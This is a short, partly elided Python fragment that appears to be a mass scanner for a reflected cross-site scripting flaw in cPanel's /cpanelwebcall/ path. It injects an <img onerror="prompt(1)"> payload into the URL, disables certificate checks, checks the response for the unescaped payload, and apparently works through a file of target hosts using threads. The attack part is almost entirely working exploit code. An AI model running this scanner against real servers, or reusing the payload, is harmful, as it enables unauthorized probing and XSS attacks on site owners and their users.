...
def exploit(ip_, index):
    try:
        ...
        url = ip_+'/cpanelwebcall/<img%20src=x%20onerror="prompt(1)">Michael.Jordan'
        # print(index,url)
        res = requests.get(url, headers=headers, timeout=8, verify=False)
        if res.status_code!=400 or '<img src=x onerror="prompt(1)">' not in res.text:
            return
...
threads = []
with open(r'D:\Downloads\tmp\cpanel.txt', 'r') as file:
